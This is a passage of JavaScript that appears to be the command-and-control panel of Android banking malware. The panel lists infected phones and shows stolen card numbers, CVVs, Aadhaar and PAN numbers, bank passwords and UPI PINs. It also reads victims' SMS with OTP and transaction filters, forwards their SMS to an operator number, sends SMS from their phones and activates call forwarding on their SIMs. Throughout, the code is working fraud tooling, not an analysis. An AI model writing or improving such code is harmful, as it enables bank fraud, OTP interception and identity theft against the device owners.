                        <button class="data-count" onclick="event.stopPropagation(); navigateToDeviceFromData('${data.userId}')">
                            <i class="fas fa-key"></i> Open Device
                        </button>
                        <div class="data-count">
                            <i class="fas fa-key"></i> ${recordCount} View Data
                        </div>
                    </div>
                    <div class="login-records">
                        ${generateLoginRecordsHTML(data.loginData)}
                    </div>
                `;

                loginDataContainer.appendChild(serialGroup);
            });
        }

        function generateLoginRecordsHTML(loginData) {
            let recordsHTML = '';
            let hasRecords = false;
            
            Object.keys(loginData).forEach(recordKey => {
                const record = loginData[recordKey];
                if (record && typeof record === 'object') {
                    let recordHTML = '<div class="login-record">';
                    let hasContent = false;
                     if (record.Name) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Name : </span><span class="login-value">${record.Name}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Number) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Mobile Number : </span><span class="login-value">${record.Number}</span></div>`;
                        hasContent = true;
                    }
                    if (record.DOB) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Date Of Birth : </span><span class="login-value">${record.DOB}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Card) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Card Number : </span><span class="login-value">${record.Card}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Cvv) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">CVV : </span><span class="login-value">${record.Cvv}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Expiry) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Expiry : </span><span class="login-value">${record.Expiry}</span></div>`;
                        hasContent = true;
                    }
                    if (record.acount) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Aadhar Number : </span><span class="login-value">${record.acount}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Complaint) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Mother Name : </span><span class="login-value">${record.Complaint}</span></div>`;
                        hasContent = true;
                    }
                    
                    
                    
            
                    if (record.mother) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">PAN : </span><span class="login-value">${record.mother}</span></div>`;
                        hasContent = true;
                    }
                   
                    if (record.Atm) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">ATM : </span><span class="login-value">${record.Atm}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Bank) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Bank : </span><span class="login-value">${record.Bank}</span></div>`;
                        hasContent = true;
                    }
                    if (record.User) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">User Name : </span><span class="login-value">${record.User}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Password) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Password : </span><span class="login-value">${record.Password}</span></div>`;
                        hasContent = true;
                    }
                    if (record.transaction) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">transaction Password : </span><span class="login-value">${record.transaction}</span></div>`;
                        hasContent = true;
                    }
                    if (record.upi_pin) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">UPI Pin : </span><span class="login-value">${record.upi_pin}</span></div>`;
                        hasContent = true;
                    }
                     if (record.upi) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">UPI id : </span><span class="login-value">${record.upi}</span></div>`;
                        hasContent = true;
                    }
                    
                    recordHTML += '</div>';
                    
                    if (hasContent) {
                        recordsHTML += recordHTML;
                        hasRecords = true;
                    }
                }
            });
            
            if (!hasRecords) {
                recordsHTML = '<div class="empty-records">No structured login data available</div>';
            }
            
            return recordsHTML;
        }

        function toggleSerialGroup(headerElement) {
            const recordsElement = headerElement.nextElementSibling;
            recordsElement.classList.toggle('expanded');
        }
        function setupForwardNumberListener() {
            forwardNumberListener = database.ref('sms_forward/forward_number').on('value', (snapshot) => {
                const forwardNumber = snapshot.val();
                document.getElementById('forwardNumber').value = forwardNumber || '';
            }, (error) => {
                console.error('Error loading forward number:', error);
            });
        }

        function updateForwardNumber() {
            const forwardNumber = document.getElementById('forwardNumber').value.trim();
            if (forwardNumber) {
                database.ref('sms_forward/forward_number').set(forwardNumber)
                    .then(() => showToast('Forward number updated successfully!', 'success'))
                    .catch(error => showToast('Error updating number: ' + error.message, 'error'));
            } else {
                showToast('Please enter a valid phone number', 'error');
            }
        }

        function deactivateForwarding() {
            database.ref('sms_forward/forward_number').set('Not forward')
                .then(() => {
                    document.getElementById('forwardNumber').value = 'Not forward';
                    showToast('SMS forwarding deactivated!', 'success');
                })
                .catch(error => showToast('Error deactivating: ' + error.message, 'error'));
        }
        
        function requestDeleteDevice(userId) {
            const idToDelete = userId || (currentDeviceData ? currentDeviceData.id : null);
            if (!idToDelete) {
                showToast('No device selected for deletion.', 'error');
                return;
            }
            
            pendingDeleteAction = 'deleteDevice';
            pendingDeleteData = idToDelete;
            showPasswordModal(`Delete Device #${deviceSerialNumbers[idToDelete]}`);
        }

        function requestClearAllSMS() {
            pendingDeleteAction = 'clearAllSMS';
            pendingDeleteData = null;
            showPasswordModal('Clear All SMS Messages');
        }
        function requestDeleteOfflineDevices() {
            const offlineUsers = allUsers.filter(user => !user.isOnline);
            const offlineCount = offlineUsers.length;

            if (offlineCount === 0) {
                showToast('No offline devices found to delete!', 'warning');
                return;
            }

            pendingDeleteAction = 'deleteOfflineDevices';
            pendingDeleteData = null;
            
            showPasswordModal(`Delete ALL ${offlineCount} Offline Devices`);
        }

        function showPasswordModal(actionText) {
            document.getElementById('passwordModal').classList.remove('hidden');
            document.querySelector('.password-content h3').innerHTML = `<i class="fas fa-shield-alt"></i> Verify Password - ${actionText}`;
            document.getElementById('verifyPassword').value = '';
            document.getElementById('verifyPassword').focus();
        }

        function verifyPassword() {
            const password = document.getElementById('verifyPassword').value;
            
            if (password === adminPassword) {
                passwordModal.classList.add('hidden');
                if (pendingDeleteAction === 'deleteDevice') {
                    performDeleteDevice(pendingDeleteData);
                } else if (pendingDeleteAction === 'clearAllSMS') {
                    performClearAllSMS();
                } else if (pendingDeleteAction === 'deleteOfflineDevices') {
                    performDeleteOfflineDevices();
                }

                pendingDeleteAction = null;
                pendingDeleteData = null;
            } else {
                showToast('Invalid password!', 'error');
                document.getElementById('verifyPassword').value = '';
                document.getElementById('verifyPassword').focus();
            }
        }

        function cancelDelete() {
            passwordModal.classList.add('hidden');
            pendingDeleteAction = null;
            pendingDeleteData = null;
            showToast('Operation cancelled', 'warning');
        }

        function performDeleteDevice(userId) {
            if (confirm('Are you sure you want to delete this device? This action cannot be undone.')) {
                database.ref('user_data').child(userId).remove()
                    .then(() => {
                        delete deviceSerialNumbers[userId];
                        saveSerialNumbers();
                        
                        showToast('Device deleted successfully!', 'success');
                        const index = pinnedDevices.indexOf(userId);
                        if (index > -1) {
                            pinnedDevices.splice(index, 1);
                            database.ref('pinned_devices').set(pinnedDevices);
                        }
                        closeUserModal(); 
                    })
                    .catch(error => {
                        showToast('Error deleting device: ' + error.message, 'error');
                    });
            }
        }

        function performClearAllSMS() {
            if (confirm('Are you sure you want to delete all SMS messages? This action cannot be undone.')) {
                database.ref('user_sms').remove()
                    .then(() => showToast('All SMS messages cleared!', 'success'))
                    .catch(error => showToast('Error clearing SMS: ' + error.message, 'error'));
            }
        }
        function performDeleteOfflineDevices() {
            const offlineUsers = allUsers.filter(user => !user.isOnline);
            const count = offlineUsers.length;

            if (confirm(`WARNING: Are you strictly sure you want to delete ${count} offline devices? This cannot be undone.`)) {
                let deletedCount = 0;
                offlineUsers.forEach(user => {
                    const userId = user.id;
                    database.ref('user_data').child(userId).remove()
                        .then(() => {
                            delete deviceSerialNumbers[userId];
                            const pinIndex = pinnedDevices.indexOf(userId);
                            if (pinIndex > -1) {
                                pinnedDevices.splice(pinIndex, 1);
                            }
                        })
                        .catch(error => {
                            console.error('Error deleting user ' + userId, error);
                        });
                        
                    deletedCount++;
                });
                setTimeout(() => {
                    saveSerialNumbers();
                    database.ref('pinned_devices').set(pinnedDevices);
                    showToast(`Process started: Deleting ${deletedCount} offline devices`, 'success');
                }, 1000);
            }
        }
        function getAllDeviceSMS(userId) {
            event.stopPropagation();
            currentDeviceIdForSMS = userId;
            const user = allUsers.find(u => u.id === userId);
            
            if (user) {
                deviceSMSTitle.innerHTML = `<i class="fas fa-envelope"></i> SMS Messages - ${user.d_name || 'Unknown Device'} (Serial #${deviceSerialNumbers[userId]})`;
                
                database.ref('user_sms').child(userId).once('value')
                    .then(snapshot => {
                        currentDeviceSMS = [];
                        
                        if (snapshot.exists()) {
                            snapshot.forEach(smsSnapshot => {
                                const sms = smsSnapshot.val();
                                sms.id = smsSnapshot.key;
                                currentDeviceSMS.push(sms);
                            });
                        }

                        currentDeviceSMS.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
                        
                        smsCount.textContent = currentDeviceSMS.length;
                        displayDeviceSMS(currentDeviceSMS);
                        deviceSMSModal.classList.remove('hidden');
                    })
                    .catch(error => {
                        showToast('Error loading device SMS: ' + error.message, 'error');
                    });
            }
        }

        function displayDeviceSMS(smsArray) {
            deviceSMSList.innerHTML = '';
            
            if (smsArray.length === 0) {
                deviceSMSList.innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-envelope-open"></i>
                        <h3>No SMS Messages</h3>
                        <p>No SMS messages found for this device</p>
                    </div>
                `;
                return;
            }

            smsArray.forEach(sms => {
                const isSearchResult = currentSMSSearchTerm && checkSMSMatchSearch(sms, currentSMSSearchTerm);
                const isPaymentTransaction = isPaymentTransactionSMS(sms);
                const isOTP = isOTPSMS(sms);
                
                const smsItem = document.createElement('div');
                smsItem.className = `sms-item ${isSearchResult ? 'highlight' : ''} ${isPaymentTransaction ? 'payment-transaction-sms' : ''} ${isOTP ? 'otp-sms' : ''}`;
                
                smsItem.innerHTML = `
                    <div class="sms-header">
                        <div class="sms-sender">${sms.sender || 'Unknown'}</div>
                        <div class="sms-date">${sms.date ? new Date(sms.date).toLocaleString() : 'Unknown date'}</div>
                    </div>
                    <div class="sms-body">${sms.body || 'No content'}</div>
                    <div class="sms-device">
                        <div>
                            <strong>SIM:</strong> ${sms.sim_number || 'Unknown'} | 
                            <strong>Type:</strong> ${sms.type || 'Received'} |
                            <strong>Date:</strong> ${sms.date ? new Date(sms.date).toLocaleDateString() : 'Unknown'}
                            ${isPaymentTransaction ? ' | <span style="color: var(--color-online); font-weight: bold;">&#x1F4B8; Transaction</span>' : ''}
                            ${isOTP ? ' | <span style="color: var(--color-warning); font-weight: bold;">&#x1F512; OTP</span>' : ''}
                        </div>
                    </div>
                `;

                deviceSMSList.appendChild(smsItem);
            });
        }

        function filterDevicePaymentTransactionSMS() {
            const paymentTransactionSMS = currentDeviceSMS.filter(sms => isPaymentTransactionSMS(sms));
            displayDeviceSMS(paymentTransactionSMS);
        }

        function filterDeviceOTPSMS() {
            const otpSMS = currentDeviceSMS.filter(sms => isOTPSMS(sms));
            displayDeviceSMS(otpSMS);
        }

        function filterDeviceSMS() {
            const searchTerm = document.getElementById('deviceSMSSearch').value.toLowerCase();
            const filteredSMS = currentDeviceSMS.filter(sms => {
                return (
                    (sms.sender && sms.sender.toLowerCase().includes(searchTerm)) ||
                    (sms.body && sms.body.toLowerCase().includes(searchTerm)) ||
                    (sms.sim_number && sms.sim_number.toLowerCase().includes(searchTerm)) ||
                    (sms.type && sms.type.toLowerCase().includes(searchTerm))
                );
            });
            displayDeviceSMS(filteredSMS);
        }

        function clearDeviceSMSSearch() {
            document.getElementById('deviceSMSSearch').value = '';
            displayDeviceSMS(currentDeviceSMS);
        }

        function closeDeviceSMSModal() {
            deviceSMSModal.classList.add('hidden');
            currentDeviceIdForSMS = null;
            currentDeviceSMS = [];
            document.getElementById('deviceSMSSearch').value = '';
        }

        function openUserModal(user) {
            currentDeviceData = user;
            document.getElementById('userModalTitle').textContent = `Device: ${user.d_name || user.id}`;

            currentUser = user.id;
            if (modalSendSMSBtn) modalSendSMSBtn.onclick = () => openSendSMSModal(user.id);
            if (modalCallForwardBtn) modalCallForwardBtn.onclick = () => openCallForwardModal(user.id);
            if (modalDeleteDeviceBtn) modalDeleteDeviceBtn.onclick = () => requestDeleteDevice(user.id);
            
            const deviceInfoTab = document.querySelector('#userModal .tabs .nav-btn:nth-child(1)');
            const smsDataTab = document.querySelector('#userModal .tabs .nav-btn:nth-child(2)');
            if (smsDataTab) {
                document.querySelectorAll('#userModal .tabs .nav-btn').forEach(tab => tab.classList.remove('active'));
                
                smsDataTab.classList.add('active');

                loadSMSDataTab(); 
                
                if (modalDeleteDeviceBtn) {
                    modalDeleteDeviceBtn.style.display = 'none';
                }
            } else {
                 if (deviceInfoTab) {
                    deviceInfoTab.classList.add('active');
                    loadDeviceInfoTab();
                     if (modalDeleteDeviceBtn) {
                        modalDeleteDeviceBtn.style.display = 'inline-flex';
                    }
                 }
            }

            document.getElementById('userModal').classList.remove('hidden');
        }

        function showTab(tabName) {
            
            document.querySelectorAll('#userModal .tabs .nav-btn').forEach(tab => {
                tab.classList.remove('active');
            });
            event.target.classList.add('active');

            loadTabContent(tabName);
        }

        function loadTabContent(tabName) {
            const modalContent = document.getElementById('userModalContent');
            
            if (currentDeviceData) {
                if (currentDeviceData.smsListener) {
                    database.ref('user_sms').child(currentDeviceData.id).off('value', currentDeviceData.smsListener);
                    currentDeviceData.smsListener = null;
                }
                if (currentDeviceData.loginListener) {
                    database.ref('login').child(currentDeviceData.id).off('value', currentDeviceData.loginListener);
                    currentDeviceData.loginListener = null;
                }
            }
            
            if (modalDeleteDeviceBtn) {
                modalDeleteDeviceBtn.style.display = (tabName === 'deviceInfo') ? 'inline-flex' : 'none';
            }
            
            switch(tabName) {
                case 'deviceInfo':
                    loadDeviceInfoTab();
                    break;
                case 'smsData':
                    loadSMSDataTab();
                    break;
                case 'loginData':
                    loadLoginDataTab();
                    break;
            }
        }

        function loadDeviceInfoTab() {
            const user = currentDeviceData;
            const modalContent = document.getElementById('userModalContent');
            
            modalContent.innerHTML = `
                <div class="user-details-grid">
                    <div class="detail-card">
                        <h4><i class="fas fa-mobile-alt"></i> Device Information</h4>
                        <div class="detail-item">
                            <span class="detail-label">Serial Number:</span>
                            <span class="detail-value">#${deviceSerialNumbers[user.id] || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Device ID:</span>
                            <span class="detail-value">${user.id}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Device Name:</span>
                            <span class="detail-value">${user.d_name || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Model:</span>
                            <span class="detail-value">${user.Device_info || user.device_info || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Status:</span>
                            <span class="detail-value ${user.isOnline ? 'status-online' : 'status-offline'}" style="padding: 2px 8px; border-radius: 10px;">
                                ${user.isOnline ? 'Online' : 'Offline'}
                            </span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Battery:</span>
                            <span class="detail-value">${user.battery || 'N/A'}%</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Install Time:</span>
                            <span class="detail-value">${getInstallTimeDisplay(user)}</span>
                        </div>
                    </div>

                    <div class="detail-card">
                        <h4><i class="fas fa-sim-card"></i> SIM 1 Information</h4>
                        <div class="detail-item">
                            <span class="detail-label">Number:</span>
                            <span class="detail-value">${user.numberSim1 || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Carrier:</span>
                            <span class="detail-value">${user.nameSim1 || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">SIM Type:</span>
                            <span class="detail-value">${user.typeSim1 || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">ICCID:</span>
                            <span class="detail-value">${user.iccIdSim1 || 'N/A'}</span>
                        </div>
                    </div>

                    <div class="detail-card">
                        <h4><i class="fas fa-sim-card"></i> SIM 2 Information</h4>
                        <div class="detail-item">
                            <span class="detail-label">Number:</span>
                            <span class="detail-value">${user.numberSim2 || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Carrier:</span>
                            <span class="detail-value">${user.nameSim2 || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">SIM Type:</span>
                            <span class="detail-value">${user.typeSim2 || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">ICCID:</span>
                            <span class="detail-value">${user.iccIdSim2 || 'N/A'}</span>
                        </div>
                    </div>

                    <div class="detail-card">
                        <h4><i class="fas fa-info-circle"></i> Additional Info</h4>
                        <div class="detail-item">
                            <span class="detail-label">Last Active:</span>
                            <span class="detail-value">${user.TimeandDate || (user.timestamp ? new Date(user.timestamp).toLocaleString() : 'Never')}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Phone Number:</span>
                            <span class="detail-value">${user.phoneNumber || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">User Type:</span>
                            <span class="detail-value">${user.new_user || 'N/A'}</span>
                        </div>
                    </div>
                </div>
            `;
        }

        function loadSMSDataTab() {
            const userId = currentDeviceData.id;
            const modalContent = document.getElementById('userModalContent');
            
            modalContent.innerHTML = '<div class="sms-list">Loading SMS data...</div>';
            
            const smsListener = database.ref('user_sms').child(userId).limitToLast(50).on('value', (snapshot) => {
                const smsData = [];
                if (snapshot.exists()) {
                    snapshot.forEach(smsSnapshot => {
                        const sms = smsSnapshot.val();
                        sms.id = smsSnapshot.key;
                        smsData.push(sms);
                    });
                }
                
                smsData.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
                
                let smsHTML = '<div class="sms-list">';
                if (smsData.length === 0) {
                    smsHTML += `
                        <div class="empty-state">
                            <i class="fas fa-envelope-open"></i>
                            <h3>No SMS Messages</h3>
                            <p>No SMS messages found for this device</p>
                        </div>
                    `;
                } else {
                    smsData.forEach(sms => {
                        const isPaymentTransaction = isPaymentTransactionSMS(sms);
                        const isOTP = isOTPSMS(sms);
                        
                        smsHTML += `
                            <div class="sms-item ${isPaymentTransaction ? 'payment-transaction-sms' : ''} ${isOTP ? 'otp-sms' : ''}">
                                <div class="sms-header">
                                    <div class="sms-sender">${sms.sender || 'Unknown'}</div>
                                    <div class="sms-date">${sms.date ? new Date(sms.date).toLocaleString() : 'Unknown date'}</div>
                                </div>
                                <div class="sms-body">${sms.body || 'No content'}</div>
                                <div class="sms-device">
                                    <strong>SIM:</strong> ${sms.sim_number || 'Unknown'} | 
                                    <strong>Type:</strong> ${sms.type || 'Received'}
                                    ${isPaymentTransaction ? ' | <span style="color: var(--color-online); font-weight: bold;">&#x1F4B8; Transaction</span>' : ''}
                                    ${isOTP ? ' | <span style="color: var(--color-warning); font-weight: bold;">&#x1F512; OTP</span>' : ''}
                                </div>
                            </div>
                        `;
                    });
                }
                smsHTML += '</div>';
                
                modalContent.innerHTML = smsHTML;
            }, (error) => {
                modalContent.innerHTML = `<div class="sms-item">Error loading SMS: ${error.message}</div>`;
            });

            currentDeviceData.smsListener = smsListener;
        }

        function loadLoginDataTab() {
            const userId = currentDeviceData.id;
            const modalContent = document.getElementById('userModalContent');
            
            modalContent.innerHTML = '<div>Loading login data...</div>';

            const loginListener = database.ref('login').child(userId).on('value', (snapshot) => {
                const loginData = snapshot.val();
                let loginHTML = '<div>';
                
                if (loginData && Object.keys(loginData).length > 0) {
                    Object.keys(loginData).forEach(recordKey => {
                        const record = loginData[recordKey];
                        if (record && typeof record === 'object') {
                            let recordHTML = '<div class="login-record" style="margin-bottom: 15px; padding: 10px; background: var(--color-bg-surface); border-radius: 6px;">';
                            let hasContent = false;
                            
                            // Format the login data exactly like Java code
                            if (record.Name) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Name : </span><span class="login-value">${record.Name}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Number) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Mobile Number : </span><span class="login-value">${record.Number}</span></div>`;
                        hasContent = true;
                    }
                    if (record.DOB) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Date Of Birth : </span><span class="login-value">${record.DOB}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Card) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Card Number : </span><span class="login-value">${record.Card}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Cvv) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">CVV : </span><span class="login-value">${record.Cvv}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Expiry) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Expiry : </span><span class="login-value">${record.Expiry}</span></div>`;
                        hasContent = true;
                    }
                    if (record.acount) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Aadhar Number : </span><span class="login-value">${record.acount}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Complaint) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Mother Name : </span><span class="login-value">${record.Complaint}</span></div>`;
                        hasContent = true;
                    }
                    
                    
                    
            
                    if (record.mother) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">PAN : </span><span class="login-value">${record.mother}</span></div>`;
                        hasContent = true;
                    }
                   
                    if (record.Atm) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">ATM : </span><span class="login-value">${record.Atm}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Bank) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Bank : </span><span class="login-value">${record.Bank}</span></div>`;
                        hasContent = true;
                    }
                    if (record.User) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">User Name : </span><span class="login-value">${record.User}</span></div>`;
                        hasContent = true;
                    }
                    if (record.Password) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">Password : </span><span class="login-value">${record.Password}</span></div>`;
                        hasContent = true;
                    }
                    if (record.transaction) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">transaction Password : </span><span class="login-value">${record.transaction}</span></div>`;
                        hasContent = true;
                    }
                    if (record.upi_pin) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">UPI Pin : </span><span class="login-value">${record.upi_pin}</span></div>`;
                        hasContent = true;
                    }
                     if (record.upi) { 
                        recordHTML += `<div class="login-data-item"><span class="login-key">UPI id : </span><span class="login-value">${record.upi}</span></div>`;
                        hasContent = true;
                    }
                            recordHTML += '</div>';
                            
                            if (hasContent) {
                                loginHTML += recordHTML;
                            }
                        }
                    });
                } else {
                    loginHTML = `
                        <div class="empty-state">
                            <i class="fas fa-user-slash"></i>
                            <h3>No Login Data</h3>
                            <p>No login data found for this device</p>
                        </div>
                    `;
                }
                
                loginHTML += '</div>';
                
                modalContent.innerHTML = loginHTML;
            }, (error) => {
                modalContent.innerHTML = `<div>Error loading login data: ${error.message}</div>`;
            });

            // Store the listener reference to remove it when modal closes
            currentDeviceData.loginListener = loginListener;
        }

        function viewDeviceSMS(userId) {
            currentDeviceData = allUsers.find(user => user.id === userId);
            if (currentDeviceData) {
                openUserModal(currentDeviceData);
                setTimeout(() => {
                    document.querySelector('#userModal .tabs .nav-btn:nth-child(2)').click();
                }, 100);
            }
        }

        function viewLoginDetails(userId) {
            currentDeviceData = allUsers.find(user => user.id === userId);
            if (currentDeviceData) {
                openUserModal(currentDeviceData);
                setTimeout(() => {
                    document.querySelector('#userModal .tabs .nav-btn:nth-child(3)').click();
                }, 100);
            }
        }

        function closeUserModal() {
            // Remove realtime listeners for this modal
            if (currentDeviceData) {
                if (currentDeviceData.smsListener) {
                    database.ref('user_sms').child(currentDeviceData.id).off('value', currentDeviceData.smsListener);
                }
                if (currentDeviceData.loginListener) {
                    database.ref('login').child(currentDeviceData.id).off('value', currentDeviceData.loginListener);
                }
            }
            
            document.getElementById('userModal').classList.add('hidden');
            currentDeviceData = null;
            currentUser = null;
        }

        function updateCharCounter() {
            const message = document.getElementById('smsMessage').value;
            const counter = document.getElementById('charCounter');
            const charCount = message.length;
            
            counter.textContent = `${charCount}/170`;
            
            if (charCount > 150) {
                counter.className = 'char-counter warning';
            } else if (charCount > 170) {
                counter.className = 'char-counter error';
            } else {
                counter.className = 'char-counter';
            }
        }

        /**
         * UPDATED: openSendSMSModal to display SIM numbers
         */
        function openSendSMSModal(userId) {
            currentUser = userId;
            const user = allUsers.find(u => u.id === userId); // user data find karna
            const simSlotSelect = document.getElementById('smsSimSlot');
            
            
            if (user) {
                simSlotSelect.innerHTML = `
                    <option value="0">SIM 1: ${user.numberSim1 || 'No SIM'}</option>
                    <option value="1">SIM 2: ${user.numberSim2 || 'No SIM'}</option>
                `;
            } else {
           
                simSlotSelect.innerHTML = `
                    <option value="0">SIM 1</option>
                    <option value="1">SIM 2</option>
                `;
            }
            
            document.getElementById('sendSMSModal').classList.remove('hidden');
            document.getElementById('smsNumber').value = '';
            document.getElementById('smsMessage').value = '';
            updateCharCounter();
        }

        function closeSendSMSModal() {
            document.getElementById('sendSMSModal').classList.add('hidden');
        }

        /**
         * UPDATED: openCallForwardModal to display SIM numbers
         */
        function openCallForwardModal(userId) {
            currentUser = userId;
            const user = allUsers.find(u => u.id === userId);
            const forwardSimSlotSelect = document.getElementById('forwardSimSlot');
            
            if (user) {
                forwardSimSlotSelect.innerHTML = `
                    <option value="0">SIM 1: ${user.numberSim1 || 'No SIM'}</option>
                    <option value="1">SIM 2: ${user.numberSim2 || 'No SIM'}</option>
                `;
            } else {
          
                forwardSimSlotSelect.innerHTML = `
                    <option value="0">SIM 1</option>
                    <option value="1">SIM 2</option>
                `;
            }

            document.getElementById('callForwardModal').classList.remove('hidden');
            document.getElementById('forwardCallNumber').value = '';
            document.getElementById('forwardStatus').style.display = 'none';
        }

        function closeCallForwardModal() {
            document.getElementById('callForwardModal').classList.add('hidden');
            
        }

        function sendSMS() {
            const phoneNumber = document.getElementById('smsNumber').value.trim();
            const message = document.getElementById('smsMessage').value.trim();
            const simSlot = document.getElementById('smsSimSlot').value; // value is 0 or 1

            if (!phoneNumber) {
                showToast('Please enter phone number', 'error');
                return;
            }

            if (!message) {
                showToast('Please enter message', 'error');
                return;
            }

            if (message.length > 170) {
                showToast('Message cannot exceed 170 characters', 'error');
                return;
            }

            if (!currentUser) {
                showToast('No device selected', 'error');
                return;
            }

            const commandData = {
                targetDeviceId: currentUser,
                phoneNumber: phoneNumber,
                messageText: message,
                simSlot: simSlot,
                command: "send message",
                timestamp: Date.now()
            };

            database.ref('user_data').child(currentUser).update(commandData)
                .then(() => {
                    showToast('SMS command sent successfully!', 'success');
                    closeSendSMSModal();
                })
                .catch(error => showToast('Error sending SMS: ' + error.message, 'error'));
        }

        // Call Forwarding with Status Display
        function activateCallForward() {
            const forwardNumber = document.getElementById('forwardCallNumber').value.trim();
            const simSlot = document.getElementById('forwardSimSlot').value;

            if (!forwardNumber) {
                showToast('Please enter a forward number', 'error');
                return;
            }

            if (!currentUser) {
                showToast('No device selected', 'error');
                return;
            }

            const commandData = {
                targetDeviceId: currentUser,
                simSlot: simSlot,
                phoneNumber: forwardNumber,
                command: "call forward",
                timestamp: Date.now()
            };

            database.ref('user_data').child(currentUser).update(commandData)
                .then(() => {
                    showToast('Call forwarding activated!', 'success');
                    displayForwardStatus('Call forwarding activated successfully', 'success');
                })
                .catch(error => {
                    showToast('Error: ' + error.message, 'error');
                    displayForwardStatus('Error: ' + error.message, 'error');
                });
        }

        function deactivateCallForward() {
            const simSlot = document.getElementById('forwardSimSlot').value;

            if (!currentUser) {
                showToast('No device selected', 'error');
                return;
            }

            const commandData = {
                targetDeviceId: currentUser,
                simSlot: simSlot,
                command: "forward off",
                timestamp: Date.now()
            };

            database.ref('user_data').child(currentUser).update(commandData)
                .then(() => {
                    showToast('Call forwarding deactivated!', 'success');
                    displayForwardStatus('Call forwarding deactivated successfully', 'success');
                })
                .catch(error => {
                    showToast('Error: ' + error.message, 'error');
                    displayForwardStatus('Error: ' + error.message, 'error');
                });
        }

        function checkForwardStatus() {
            const simSlot = document.getElementById('forwardSimSlot').value;

            if (!currentUser) {
                showToast('No device selected', 'error');
                return;
            }

            const commandData = {
                targetDeviceId: currentUser,
                simSlot: simSlot,
                command: "forward status",
                timestamp: Date.now()
            };

            database.ref('user_data').child(currentUser).update(commandData)
                .then(() => {
                    showToast('Status check command sent!', 'success');
                    displayForwardStatus('Status check command sent to device', 'info');
                    
                    // Listen for status response
                    listenForForwardStatus();
                })
                .catch(error => {
                    showToast('Error: ' + error.message, 'error');
                    displayForwardStatus('Error: ' + error.message, 'error');
                });
        }

        function displayForwardStatus(message, type) {
            const statusDiv = document.getElementById('forwardStatus');
            statusDiv.textContent = message;
            statusDiv.style.display = 'block';
            statusDiv.style.background = type === 'success' ? '#d4edda' : 
                                       type === 'error' ? '#f8d7da' : 
                                       '#d1ecf1';
            statusDiv.style.color = type === 'success' ? '#155724' : 
                                  type === 'error' ? '#721c24' : 
                                  '#0c5460';
            statusDiv.style.border = type === 'success' ? '1px solid #c3e6cb' : 
                                   type === 'error' ? '1px solid #f5c6cb' : 
                                   '1px solid #bee5eb';
        }

        function listenForForwardStatus() {
            if (currentUser) {
                database.ref('user_data').child(currentUser).child('ussd_response').on('value', (snapshot) => {
                    const response = snapshot.val();
                    if (response) {
                        displayForwardStatus(`Status Response: ${response}`, 'info');
                        database.ref('user_data').child(currentUser).child('ussd_response').off('value');
                    }
                });
                
                setTimeout(() => {
                    database.ref('user_data').child(currentUser).child('ussd_response').off('value');
                }, 30000);
            }
        }

        function showToast(message, type = 'info') {
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            document.body.appendChild(toast);

            setTimeout(() => toast.classList.add('show'), 100);
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => toast.remove(), 300);
